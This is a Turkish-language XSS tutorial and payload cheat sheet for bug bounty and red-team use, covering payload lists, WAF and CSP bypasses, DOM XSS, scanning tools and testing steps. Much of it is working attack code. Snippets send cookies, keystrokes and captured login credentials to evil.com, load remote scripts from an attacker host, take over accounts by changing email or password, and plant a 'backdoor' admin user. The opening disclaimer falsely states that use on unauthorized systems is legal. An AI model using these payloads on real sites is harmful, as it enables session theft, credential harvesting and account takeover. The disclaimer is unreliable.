# 🎯 Cross-Site Scripting (XSS) — Tam Türkçe Rehber 2026
 
> **vNEz** tarafından hazırlanmıştır. Bug Bounty ve Red Team operasyonlarında kullanılan gerçek XSS tekniklerini kapsar.
> 
> ⚠️ **Yasal Uyarı:** Bu rehberdeki teknikler yalnızca yetkili sistemlerde (bug bounty programları, kendi lab ortamın, CTF) kullanılmak üzere hazırlanmıştır. İzinsiz sistemlerde uygulamak yasaldır.

---

## 📌 İçindekiler

- [XSS Nedir?](#xss-nedir)
- [Aşama 1 — XSS Türleri](#aşama-1--xss-türleri)
  - [Reflected XSS](#1-reflected-xss)
  - [Stored XSS](#2-stored-xss)
  - [DOM-Based XSS](#3-dom-based-xss)
  - [Blind XSS](#4-blind-xss)
- [Aşama 2 — Temel Payload Listesi](#aşama-2--temel-payload-listesi)
- [Aşama 3 — WAF Bypass Teknikleri](#aşama-3--waf-bypass-teknikleri)
- [Aşama 4 — CSP Bypass](#aşama-4--csp-bypass)
- [Aşama 5 — DOM XSS Derinlemesine](#aşama-5--dom-xss-derinlemesine)
- [Aşama 6 — XSS → Account Takeover Zinciri](#aşama-6--xss--account-takeover-zinciri)
- [Aşama 7 — Otomasyon Araçları](#aşama-7--otomasyon-araçları)
- [Aşama 8 — Test Metodolojisi (Adım Adım)](#aşama-8--test-metodolojisi-adım-adım)
- [Payload Cheatsheet](#payload-cheatsheet)
- [Lab & Pratik Ortamlar](#lab--pratik-ortamlar)

---

## XSS Nedir?

**Cross-Site Scripting (XSS)**, bir saldırganın hedef web uygulamasına zararlı JavaScript kodu enjekte etmesine ve bu kodun kurbanın tarayıcısında çalışmasına olanak tanıyan bir güvenlik açığıdır.

### Neden Tehlikeli?

Tarayıcıda çalışan kod, o sitenin tüm yetkilerine sahiptir:

| Saldırı | Açıklama |
|---------|----------|
| **Cookie Çalma** | `document.cookie` ile session token'ı çal |
| **Keylogger** | Kullanıcının yazdıklarını kaydet |
| **Phishing** | Sayfayı manipüle et, sahte login formu göster |
| **CSRF Bypass** | Kullanıcı adına istek yap |
| **Account Takeover** | Şifre/email değiştir |
| **Malware Dağıtımı** | Kullanıcıyı zararlı siteye yönlendir |
| **Port Scan** | İç ağı tara (tarayıcı üzerinden) |
| **Screenshot** | Ekran görüntüsü al (HTML2Canvas) |

### CVSS Skoru

Stored XSS kritik uygulamalarda **9.0+** puan alabilir. Account takeover ile birleşince **maksimum etki** sınıfına girer.

---

## Aşama 1 — XSS Türleri

### 1. Reflected XSS

**Nasıl çalışır?**  
Kullanıcı girdisi sunucuda işlenip doğrudan yanıta yansıtılır. Kalıcı değildir — kurbanın hazırlanmış bir linke tıklaması gerekir.

```
https://target.com/search?q=<script>alert(1)</script>
```

Sunucu bu parametreyi doğrudan HTML'e yazar:

```html
<p>Arama sonucu: <script>alert(1)</script></p>
```

**Nerede aranır?**
- Arama kutuları (`q=`, `search=`, `query=`)
- Hata mesajları (`error=`, `msg=`)
- Geri yönlendirme parametreleri (`redirect=`, `next=`, `url=`)
- Kullanıcı adı/profil bilgilerinin anlık gösterildiği alanlar

**Etki:** Orta — Kurbanın linke tıklaması şart.

---

### 2. Stored XSS

**Nasıl çalışır?**  
Payload veritabanına kaydedilir ve sayfayı her ziyaret eden kullanıcıda tetiklenir. En tehlikeli XSS türü.

**Örnek senaryo:**

Bir forum sitesinde yorum alanına şunu yazarsın:
```html
Merhaba! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

Bu yorum veritabanına kaydedilir. Sayfayı açan **her admin dahil her kullanıcıda** kod çalışır.

**Nerede aranır?**
- Yorum / forum gönderileri
- Profil bilgileri (bio, isim, şehir)
- Ürün incelemeleri
- Chat / mesajlaşma sistemleri
- Destek biletleri
- Dosya adları (upload'larda)
- SVG dosyası yükleme alanları
- Markdown render eden alanlar

**Etki:** Kritik — Bir kez enjekte et, tüm ziyaretçileri etkile.

---

### 3. DOM-Based XSS

**Nasıl çalışır?**  
Payload sunucuya hiç ulaşmaz. JavaScript kodu, DOM'daki kullanıcı kontrolündeki bir değeri okuyup güvensiz bir şekilde sayfaya yazar.

**Klasik örnek:**

```javascript
// Güvensiz kod
document.getElementById("output").innerHTML = location.hash.substring(1);
```

URL: `https://target.com/page#<img src=x onerror=alert(1)>`

Sunucu `#` sonrasını görmez ama tarayıcı `innerHTML`'e yazar → XSS!

**Tehlikeli JavaScript kaynakları (Source):**

```javascript
location.href          // Tam URL
location.hash          // # sonrası
location.search        // ? sonrası parametreler
location.pathname      // /path kısmı
document.referrer      // Nereden gelindi
window.name            // Pencere adı
document.cookie        // Cookie değerleri
localStorage / sessionStorage
postMessage() verisi
```

**Tehlikeli JavaScript hedefleri (Sink):**

```javascript
innerHTML              // En yaygın
outerHTML
document.write()
document.writeln()
eval()
setTimeout("string")
setInterval("string")
new Function("string")
location.href = ...    // Open Redirect → XSS
src = ...              // Script, iframe, img
```

**Etki:** Orta-Yüksek — Sunucu loglarında iz bırakmaz, WAF'ları atlatır.

---

### 4. Blind XSS

**Nasıl çalışır?**  
Payload'ı enjekte edersin ama ne zaman tetikleneceğini bilemezsin. Genellikle admin panelinde veya log görüntüleme sisteminde çalışır.

**Nerede aranır?**
- Destek formu / iletişim formu
- Hata raporlama alanları
- Kullanıcı kayıt formları (admin listede görebilir)
- HTTP başlıkları (`User-Agent`, `Referer`, `X-Forwarded-For`)
- Log dosyaları görüntüleyen sistemler
- Sipariş notları, fatura adresi

**Kullanılan araç:** `XSS Hunter` veya kendi OOB (Out-of-Band) sunucun

```html
<!-- XSS Hunter payload örneği -->
"><script src="https://yourxsshunter.xss.ht"></script>

<!-- Kendi sunucuna ping atan payload -->
"><script>new Image().src='https://evil.com/blind?c='+document.cookie+'&u='+location.href</script>
```

**Etki:** Kritik — Admin cookie'si çalmak büyük ödül demek.

---

## Aşama 2 — Temel Payload Listesi

### Temel Doğrulama Payloadları

```html
<!-- Klasik test -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- confirm ve prompt alternatifleri (WAF'ları atlatmak için) -->
<script>confirm(1)</script>
<script>prompt(1)</script>

<!-- console.log (sessiz test) -->
<script>console.log(1)</script>
```

### HTML Tag Enjeksiyonları

```html
<!-- img tag -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
<img src=x onerror="alert(1)">
<img src="javascript:alert(1)">

<!-- svg tag -->
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload="alert(1)">
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x></svg>
<svg><a><rect width=100% height=100% /><set attributeName=href onbegin=alert(1)></svg>

<!-- body tag -->
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onerror=alert(1)>

<!-- input tag -->
<input autofocus onfocus=alert(1)>
<input onmouseover=alert(1)>
<input type="image" src=x onerror=alert(1)>

<!-- video/audio -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<video><source onerror=alert(1)>

<!-- details/summary (user interaction gerektirmez) -->
<details open ontoggle=alert(1)>
<details/open/ontoggle=alert(1)>

<!-- iframe -->
<iframe src="javascript:alert(1)">
<iframe onload=alert(1) src="data:text/html,x">
<iframe srcdoc="<script>alert(1)</script>">

<!-- object/embed -->
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">

<!-- link -->
<link rel=stylesheet href="javascript:alert(1)">

<!-- math -->
<math href=javascript:alert(1)>CLICK</math>
```

### Attribute Enjeksiyonları

```html
<!-- Mevcut bir attribute içine kaçma -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onmouseover='alert(1)
` onmouseover=`alert(1)`

<!-- Attribute değeri içinde (encoding'i aşmak için) -->
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### JavaScript Bağlamı İçinde

```javascript
// String içinden çıkma
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

// Template literal
`${alert(1)}`

// Fonksiyon çağrısı
alert`1`
(alert)(1)
a=alert,a(1)
```

### Encoding Varyantları

```html
<!-- HTML Entity encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Hex encoding (JS bağlamında) -->
\x3cscript\x3ealert(1)\x3c/script\x3e

<!-- JavaScript'te string parçalama -->
<script>eval(atob('YWxlcnQoMSk='))</script>
<!-- YWxlcnQoMSk= = base64("alert(1)") -->
```

---

## Aşama 3 — WAF Bypass Teknikleri

### Neden WAF Bypass Gerekir?

Web Application Firewall'lar belirli kalıpları (örn. `<script>`, `alert`, `onerror`) kara listeye alır. Amacımız bu filtreleri aşarak aynı sonucu farklı sözdizimi ile elde etmek.

### 1. Büyük/Küçük Harf Karıştırma

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
<img src=x OnErRoR=alert(1)>
```

### 2. Tag Karıştırma

```html
<!-- Kapanmamış tag -->
<script
>alert(1)</script>

<!-- Arada garip karakterler -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr ipt>alert(1)</scr ipt>

<!-- Slash kullanımı -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

### 3. `alert` Kelimesini Atlatma

```javascript
// Parantez olmadan çağrı
alert`1`
alert`document.cookie`

// Değişkene ata
a=alert;a(1)
window['alert'](1)
this['alert'](1)
self['alert'](1)

// String birleştirme
(function(x){return x})(alert)(1)
window['\x61\x6c\x65\x72\x74'](1)   // hex: "alert"
window['\u0061\u006c\u0065\u0072\u0074'](1)  // unicode

// Eval ile
eval('ale'+'rt(1)')
eval(atob('YWxlcnQoMSk='))

// setTimeout/setInterval
setTimeout('alert(1)')
setInterval('alert(1)',0)

// Function constructor
Function('alert(1)')()
new Function`alert\`1\``()

// Diğer popup fonksiyonları (alert yerine)
confirm(1)
prompt(1)
console.log(1)   // Sessiz (loglanır, popup çıkmaz)
```

### 4. `<script>` Tag Yerine Alternatifler

```html
<!-- Hiç script tag kullanmadan -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video autoplay onplay=alert(1) src=x>
```

### 5. Filtre Atlatma — `onerror` Yerine

```html
<!-- Tıklama gerektiren event'lar -->
onclick, ondblclick, onmousedown, onmouseup
onmouseover, onmouseout, onmousemove
onkeydown, onkeyup, onkeypress

<!-- Otomatik event'lar -->
onload, onerror, onpageshow, onhashchange
onfocus (autofocus ile birlikte)
onblur, ontoggle (details tag ile)
onanimationend, ontransitionend
```

### 6. JavaScript Protokolü

```html
<a href="javascript:alert(1)">Tıkla</a>

<!-- Boşluklar ve encoding ile -->
<a href="   javascript:alert(1)">Tıkla</a>
<a href="javascript&#58;alert(1)">Tıkla</a>
<a href="&#106;avascript:alert(1)">Tıkla</a>
<a href="j&#97;vascript:alert(1)">Tıkla</a>
<a href="JAVASCRIPT:alert(1)">Tıkla</a>
<a href="java
script:alert(1)">Tıkla</a>
```

### 7. Data URI

```html
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="data:text/html,<script>alert(1)</script>">
```

### 8. Çift Encoding (Double Encoding)

Bazı WAF'lar tek decoding yapar, uygulama ikinci kez decode ederse bypass olur:

```
%253Cscript%253Ealert(1)%253C/script%253E
→ WAF görür: %3Cscript%3E... (tehlikesiz gibi)
→ Uygulama decode eder: <script>alert(1)</script>
```

### 9. Null Byte & Özel Karakterler

```html
<scr\x00ipt>alert(1)</script>
<scr\x09ipt>alert(1)</script>   <!-- Tab -->
<scr\x0aipt>alert(1)</script>   <!-- Newline -->
<scr\x0dipt>alert(1)</script>   <!-- Carriage return -->
```

### 10. Filter Evasion — Kelime Parçalama

```html
<!-- "script" kelimesi filtreleniyorsa -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Filtreleme sonrası birleşen payload -->
<img src="x" o<blah>nerror="alert(1)">
```

---

## Aşama 4 — CSP Bypass

### CSP Nedir?

Content Security Policy (CSP), tarayıcıya hangi kaynaklardan script çalıştırabileceğini söyleyen bir güvenlik başlığıdır.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

Bu politika yalnızca aynı origin ve `cdn.example.com`'dan script yüklenmesine izin verir.

### CSP'yi Test Et

```javascript
// Konsol'da aktif CSP'yi gör
document.querySelector('meta[http-equiv="Content-Security-Policy"]')

// Network sekmesinde response header'larına bak
// veya burp suite ile yakala
```

### CSP Bypass Teknikleri

#### 1. `unsafe-inline` Varsa — Direkt Çalıştır

```
script-src 'self' 'unsafe-inline'
```
Bu varsa CSP zaten kırılmış, normal `<script>alert(1)</script>` çalışır.

#### 2. `unsafe-eval` Varsa

```
script-src 'self' 'unsafe-eval'
```

```javascript
eval('alert(1)')
setTimeout('alert(1)', 0)
new Function('alert(1)')()
```

#### 3. Wildcard Domain Varsa

```
script-src *.example.com
```

Saldırgan `evil.example.com`'u kontrol edebilirse:

```html
<script src="https://evil.example.com/xss.js"></script>
```

#### 4. CDN Bypass — Güvenilir CDN Üzerinden

```
script-src https://cdn.jsdelivr.net
```

JSDelivr, kullanıcının GitHub repo'sunu CDN olarak sunar:

```html
<script src="https://cdn.jsdelivr.net/gh/kullaniciad/repo@main/evil.js"></script>
```

#### 5. JSONP Bypass

Güvenilen domain'de JSONP endpoint varsa:

```html
<!-- Google Analytics'in JSONP endpoint'i -->
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>

<!-- Angular JSONP endpoint'i -->
<script src="https://accounts.google.com/o/oauth2/revoke?token=alert(1)"></script>
```

#### 6. `script-src` Eksikse `default-src` Geçerlidir

```
Content-Security-Policy: default-src 'self'
```

`default-src` yalnızca `script-src` belirtilmemişse geçerlidir. `object-src` ayrıca belirtilmemişse:

```html
<object data="data:text/html,<script>alert(1)</script>">
```

#### 7. Base Tag Hijacking

```
script-src 'nonce-abc123'
```

Eğer `base-uri` direktifi yoksa:

```html
<base href="https://evil.com">
```

Relative path'li scriptler artık evil.com'dan yüklenir.

#### 8. Nonce Bypass — DOM Clobbering ile

Nonce her istekte değiştirilmiyorsa, sayfadaki mevcut nonce'u çal:

```javascript
// Sayfadaki nonce'u bul ve kullan
document.querySelector('script').nonce
```

#### 9. `strict-dynamic` ile

`strict-dynamic` varsa, güvenilen bir script başka scriptler yükleyebilir. Güvenilen bir script'e XSS varsa zincir kurulabilir.

#### 10. Iframe + CSP Farklılığı

Ana sayfa kısıtlıysa ama iframe'deki sayfa kısıtlı değilse:

```html
<iframe src="https://target.com/unprotected-page" onload="this.contentWindow.eval('alert(1)')">
```

### CSP Analiz Araçları

```bash
# Online CSP analiz
https://csp-evaluator.withgoogle.com/

# Burp Suite Extension: CSP Auditor
# Firefox: CSP Developer Tool eklentisi
```

---

## Aşama 5 — DOM XSS Derinlemesine

### Kaynak (Source) Tespiti

Önce kullanıcı kontrolünde hangi değerlerin okunduğunu tespit et:

```javascript
// location.hash'i kullanan kod ara
grep -r "location.hash" *.js

// location.search kullanan kod
grep -r "location.search" *.js
grep -r "location.href" *.js
grep -r "document.referrer" *.js
grep -r "window.name" *.js
```

### Hedef (Sink) Tespiti

```javascript
// Tehlikeli sink'leri ara
grep -r "innerHTML" *.js
grep -r "outerHTML" *.js
grep -r "document.write" *.js
grep -r "eval(" *.js
grep -r "setTimeout(" *.js
grep -r "setInterval(" *.js
```

### DOM XSS — Gerçek Dünya Örnekleri

**Örnek 1: Hash'ten innerHTML'e**

```javascript
// Kaynak kod
window.onhashchange = function() {
    document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1));
}
```

Payload:
```
https://target.com/#<img src=x onerror=alert(1)>
```

---

**Örnek 2: postMessage ile DOM XSS**

```javascript
// Hedef sayfa
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});
```

Saldırı (kendi sayfandan):
```html
<iframe src="https://target.com" id="frame"></iframe>
<script>
    document.getElementById('frame').onload = function() {
        frame.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
    }
</script>
```

---

**Örnek 3: localStorage'dan Sink'e**

```javascript
// localStorage'dan oku ve yaz
var theme = localStorage.getItem('theme');
document.body.innerHTML += '<link rel="stylesheet" href="' + theme + '">';
```

```javascript
// localStorage'ı doldur, sonra sayfayı yenile
localStorage.setItem('theme', 'x" onerror="alert(1)');
```

---

**Örnek 4: Angular Template Injection (Client-Side)**

Angular uygulamalarında `{{}}` ile template injection:

```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

---

**Örnek 5: jQuery ile DOM XSS**

```javascript
// Güvensiz jQuery kullanımı
$(location.hash)  // hash'i jQuery selektor olarak kullanmak!
```

Payload:
```
https://target.com/#<img src=x onerror=alert(1)>
```

### DOM XSS Bulma Araçları

```bash
# dalfox — DOM XSS dahil otomatik tarama
dalfox url "https://target.com/page#FUZZ"

# DOMinator — tarayıcı extension ile kaynak/hedef analizi
# https://github.com/wisec/dominator

# Burp Suite Pro — DOM Invader
# Extension olarak DOM Invader'ı aktif et, canary token enjekte et

# Chrome DevTools
# Sources > Search > innerHTML veya eval ara
```

---

## Aşama 6 — XSS → Account Takeover Zinciri

XSS buldun, şimdi maksimum etkiyi nasıl yaratırsın?

### Adım 1 — Cookie Çalma (Session Hijacking)

```javascript
// Temel cookie çalma
<script>
document.location='https://evil.com/steal?c='+encodeURIComponent(document.cookie)
</script>

// Fetch ile (daha sessiz)
<script>
fetch('https://evil.com/steal?c='+btoa(document.cookie))
</script>

// Image ile (en basit OOB)
<script>
new Image().src='https://evil.com/c?'+document.cookie
</script>

// XMLHttpRequest ile
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://evil.com/steal?c='+document.cookie);
xhr.send();
</script>
```

> **Not:** `HttpOnly` flag'i olan cookie'ler `document.cookie` ile okunamaz. Ama bu durumda bile XSS ile diğer saldırılar uygulanabilir.

### Adım 2 — HttpOnly Cookie'yi Atlatma

Cookie `HttpOnly` ise `document.cookie` ile okuyamazsın. Ama şunları yapabilirsin:

**a) CSRF + XSS Kombinasyonu:**
```javascript
// Kullanıcı adına istek yap (cookie otomatik gönderilir)
<script>
fetch('https://target.com/api/change-email', {
    method: 'POST',
    credentials: 'include',   // Cookie'yi otomatik gönder
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
})
</script>
```

**b) Şifre Değiştirme:**
```javascript
<script>
// Önce CSRF token'ı çek
fetch('/account/settings')
    .then(r => r.text())
    .then(html => {
        // CSRF token'ı parse et
        var csrf = html.match(/name="csrf_token" value="([^"]+)"/)[1];
        
        // Şifre değiştir
        return fetch('/account/change-password', {
            method: 'POST',
            credentials: 'include',
            body: new URLSearchParams({
                csrf_token: csrf,
                new_password: 'Hacked123!',
                confirm_password: 'Hacked123!'
            })
        });
    })
</script>
```

**c) Email Değiştirme → Şifre Sıfırlama:**
```javascript
<script>
// Email değiştir
fetch('/api/user/update', {
    method: 'PUT',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
}).then(() => {
    // Şimdi şifre sıfırlama maili attacker'a gelecek
    fetch('/api/auth/forgot-password', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'attacker@evil.com'})
    });
});
</script>
```

### Adım 3 — Keylogger

```javascript
<script>
var keys = '';
document.addEventListener('keydown', function(e) {
    keys += e.key;
    if (keys.length > 20) {
        fetch('https://evil.com/keys?d=' + btoa(keys));
        keys = '';
    }
});
</script>
```

### Adım 4 — Form Hijacking (Credential Harvest)

Login formunun submit olayını yakala:

```javascript
<script>
document.querySelector('form').addEventListener('submit', function(e) {
    var user = document.querySelector('input[type=email]').value;
    var pass = document.querySelector('input[type=password]').value;
    fetch('https://evil.com/creds?u='+user+'&p='+pass);
    // Formu normal gönder (kullanıcı fark etmez)
});
</script>
```

### Adım 5 — İç Ağ Tarama (Browser as a Scanner)

```javascript
<script>
// İç ağdaki hostları tara
var targets = ['192.168.1.1', '192.168.1.254', '10.0.0.1'];
targets.forEach(function(ip) {
    var img = new Image();
    img.onload = function() {
        fetch('https://evil.com/alive?ip=' + ip);
    };
    img.src = 'http://' + ip + '/favicon.ico';
});
</script>
```

### Adım 6 — Admin İşlemi Tetikleme

Admin sayfasında çalışan Stored XSS:

```javascript
<script>
// Admin hesabı oluştur
fetch('/admin/api/users', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        username: 'backdoor',
        password: 'Password123!',
        role: 'admin'
    })
})
</script>
```

### Adım 7 — XSS ile Ekran Görüntüsü (html2canvas)

```javascript
<script>
// html2canvas kütüphanesi ile sayfa screenshot'ı
var script = document.createElement('script');
script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
script.onload = function() {
    html2canvas(document.body).then(function(canvas) {
        fetch('https://evil.com/screenshot', {
            method: 'POST',
            body: canvas.toDataURL()
        });
    });
};
document.head.appendChild(script);
</script>
```

---

## Aşama 7 — Otomasyon Araçları

### 1. dalfox — En Kapsamlı XSS Tarayıcı

```bash
# Tek URL
dalfox url "https://target.com/search?q=test"

# Parametreli URL, tüm parametreleri test et
dalfox url "https://target.com/page?id=1&name=test" --all-params

# Pipe ile giriş
echo "https://target.com/search?q=test" | dalfox pipe

# Dosyadan URL listesi
dalfox file urls.txt

# Burp isteklerinden
dalfox file burp_requests.txt --format burp

# DOM XSS de dahil etmek için (headless)
dalfox url "https://target.com" --use-headless-chromium

# Blind XSS (kendi sunucuna OOB)
dalfox url "https://target.com/search?q=test" \
  --blind https://yourserver.com/blind

# WAF bypass modunda
dalfox url "https://target.com/search?q=test" \
  --waf-evasion

# Hız kontrolü
dalfox url "https://target.com/search?q=test" \
  --delay 1000 --timeout 10

# Output
dalfox url "https://target.com/search?q=test" \
  --output results.txt --format json
```

### 2. XSStrike — Akıllı Payload Üretici

```bash
# Tek URL
python xsstrike.py -u "https://target.com/search?q=test"

# POST isteği
python xsstrike.py -u "https://target.com/login" \
  --data "username=test&password=test"

# DOM tabanlı arama
python xsstrike.py -u "https://target.com" --dom

# Fuzzing modu
python xsstrike.py -u "https://target.com/search?q=test" --fuzzer

# Crawler ile site geneli
python xsstrike.py -u "https://target.com" --crawl -l 3
```

### 3. kxss — Hızlı Parametre Filtresi

```bash
# URL listesinden XSS parametrelerini filtrele
cat all_urls.txt | kxss

# Belirli karakterlerin geçip geçmediğini test et
# kxss: <, >, ", ', ` karakterlerini test eder
echo "https://target.com/search?q=test" | kxss
```

### 4. Gxss — Reflected Parametre Bulucu

```bash
cat all_urls.txt | Gxss -p test -o reflected_params.txt

# Sonuçları dalfox ile birleştir
cat reflected_params.txt | dalfox pipe
```

### 5. qsreplace + ffuf ile Manual Fuzzing Pipeline

```bash
# Tüm parametreleri XSS payload ile değiştir
cat all_urls.txt \
  | grep "=" \
  | qsreplace '"><svg onload=alert(1)>' \
  | while read url; do
      curl -s "$url" | grep -q 'onload=alert(1)' && echo "[XSS] $url"
    done

# ffuf ile parametre fuzzing
ffuf -u "https://target.com/search?q=FUZZ" \
  -w xss_payloads.txt \
  -mr "onload=alert|onerror=alert|alert(1)" \
  -o xss_results.json
```

### 6. waybackurls + kxss Pipeline

```bash
# Wayback'ten URL topla → parametreleri filtrele → XSS test et
waybackurls target.com \
  | grep "=" \
  | sort -u \
  | kxss \
  | tee kxss_results.txt

# Veya dalfox'a pipe et
waybackurls target.com \
  | grep "=" \
  | sort -u \
  | dalfox pipe --silence
```

### 7. Nuclei ile XSS Template Tarama

```bash
# XSS template'lerini çalıştır
nuclei -l alive_subs.txt \
  -t nuclei-templates/http/vulnerabilities/generic/generic-xss.yaml \
  -o nuclei_xss.txt

# Tüm XSS ilgili template'ler
nuclei -l alive_subs.txt \
  -tags xss \
  -o nuclei_xss_all.txt
```

### 8. Burp Suite İş Akışı

```
1. Proxy ile siteyi gez
2. Target > Scope'u ayarla
3. Scanner > Audit Issues > XSS
4. Intruder ile parametreleri fuzz'la:
   - Payload: XSS payload listesi
   - Grep Match: <svg, onerror, alert
5. DOM Invader extension'ını aktif et
6. Repeater ile manuel test
```

---

## Aşama 8 — Test Metodolojisi (Adım Adım)

### Adım 1 — Saldırı Yüzeyini Belirle

```bash
# Tüm URL'leri topla
waybackurls target.com | sort -u > all_urls.txt
gau target.com >> all_urls.txt
katana -u target.com -jc >> all_urls.txt

# Parametreli URL'leri ayır
cat all_urls.txt | grep "=" | sort -u > params_urls.txt

# Parametreleri temizle (değerleri sil)
cat params_urls.txt | sed 's/=[^&]*/=/g' | sort -u > clean_params.txt

wc -l params_urls.txt
```

### Adım 2 — Yansıma Testi

```bash
# Hangi parametreler giriş değerini yansıtıyor?
cat params_urls.txt \
  | qsreplace "TESTSTRING12345" \
  | while read url; do
      response=$(curl -s "$url")
      echo "$response" | grep -q "TESTSTRING12345" && echo "[REFLECTED] $url"
    done
```

### Adım 3 — Karakter Filtresi Testi

```bash
# Özel karakterlerin filtrlenip filtrelenmediğini test et
CHARS='<>"'"'"'`{}/\()=;:'
for char in $(echo $CHARS | sed 's/./& /g'); do
    response=$(curl -s "https://target.com/search?q=${char}TEST")
    echo "$response" | grep -q "${char}TEST" && echo "[PASSED] $char" || echo "[FILTERED] $char"
done
```

### Adım 4 — Bağlamı Belirle

Değerin nerede yansıdığını anla:

```html
<!-- HTML bağlamı -->
<p>Merhaba, PAYLOAD</p>
→ <script>alert(1)</script> veya <img src=x onerror=alert(1)>

<!-- Attribute değeri bağlamı (çift tırnak) -->
<input value="PAYLOAD">
→ " onmouseover="alert(1) veya "><script>alert(1)</script>

<!-- Attribute değeri bağlamı (tek tırnak) -->
<input value='PAYLOAD'>
→ ' onmouseover='alert(1)

<!-- JavaScript string bağlamı (çift tırnak) -->
var x = "PAYLOAD";
→ "-alert(1)-" veya ";alert(1)//

<!-- JavaScript string bağlamı (tek tırnak) -->
var x = 'PAYLOAD';
→ '-alert(1)-' veya ';alert(1)//

<!-- HTML comment bağlamı -->
<!-- PAYLOAD -->
→ --> <script>alert(1)</script> <!--

<!-- URL bağlamı (href, src) -->
<a href="PAYLOAD">
→ javascript:alert(1)
```

### Adım 5 — Payload Seç ve Test Et

Bağlama uygun payload seç:

```bash
# HTML bağlamı için
curl -s "https://target.com/search?q=<img src=x onerror=alert(1)>"

# Attribute bağlamı için
curl -s 'https://target.com/search?q=" onmouseover="alert(1)'

# JavaScript bağlamı için
curl -s "https://target.com/search?q=';alert(1)//"
```

### Adım 6 — WAF Varsa Bypass Dene

```bash
# WAF tespiti
wafw00f https://target.com

# WAF bypass payload'ları dene
dalfox url "https://target.com/search?q=test" --waf-evasion
```

### Adım 7 — Etkiyi Kanıtla (PoC)

Bug bounty için basit `alert(1)` değil, gerçek etkiyi göster:

```javascript
// Daha etkileyici PoC: domain'i göster
<script>alert(document.domain)</script>

// Cookie'yi göster
<script>alert(document.cookie)</script>

// Kullanıcı bilgilerini fetch et ve göster
<script>
fetch('/api/user/profile', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>alert('USER: '+d.email+'\nROLE: '+d.role))
</script>
```

### Adım 8 — Rapor Yaz

İyi bir XSS raporu şunları içerir:
1. **Açıklama** — XSS'in türü ve etki alanı
2. **Adımlar** — Nasıl yeniden üretilir
3. **PoC URL** veya video
4. **Etki** — Ne yapılabilir (cookie çalma, account takeover vb.)
5. **Önerilen Düzeltme** — Encoding, CSP, HttpOnly

---

## Payload Cheatsheet

### 🏆 En Güvenilir Payloadlar

```html
<!-- TOP 10 — Çoğu uygulamada çalışan -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<img src=x onerror=alert`1`>
javascript:alert(1)
"><script>alert(1)</script>
```

### 🔓 WAF Bypass Payloadları

```html
<!-- Büyük/küçük harf -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- Encoding -->
<img src=x onerror=\u0061lert(1)>
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- Parantez yok -->
<img src=x onerror=alert`1`>
<script>alert`1`</script>
<svg onload=alert`document.domain`>

<!-- alert yok -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=console.log(1)>

<!-- Araya karakter -->
<img/src=x/onerror=alert(1)>
<img src="x" onerror = alert(1)>
```

### 🍪 Cookie Çalma Payloadları

```html
<script>document.location='https://evil.com/?c='+document.cookie</script>
<img src=x onerror=this.src='https://evil.com/?c='+document.cookie>
<svg onload=fetch('https://evil.com/?c='+btoa(document.cookie))>
```

### 🎯 Blind XSS Payloadları

```html
"><script src="https://yourxsshunter.xss.ht"></script>
'><script src="https://yourxsshunter.xss.ht"></script>
"><img src=x onerror="var s=document.createElement('script');s.src='https://yourserver/xss.js';document.head.appendChild(s)">
```

---

## Lab & Pratik Ortamlar

| Platform | URL | Açıklama |
|----------|-----|----------|
